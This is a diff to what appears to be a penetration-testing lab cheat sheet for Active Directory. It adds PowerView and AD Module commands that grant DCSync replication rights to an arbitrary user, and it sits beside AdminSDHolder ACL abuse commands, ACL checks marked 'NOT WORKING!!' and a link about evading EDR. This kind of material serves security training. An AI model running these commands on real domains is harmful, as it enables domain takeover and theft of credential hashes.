@@ -278,8 +278,15 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 
 ```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,D C=lab' -Principal student1 -Verbose``` - AD Module
 
-Check ACLs:
 
+•  Add DCSync permissions ("DC Replication" rights) for an arbitrary user to AdminSDHolder 
+
+```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName bob -Rights DCSync -Verbose``` - PowerView
+
+```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal bob -GUIDRight DCSync -Verbose``` - AD Module
+
+Check ACLs:
+NOT WORKING!!
 ```Get-ObjectAcl -SamAccountName "Domain Admins" - ResolveGUIDs | ?{$_.IdentityReference -match 'Josh'}```
 
 ```Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ?{ ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }```
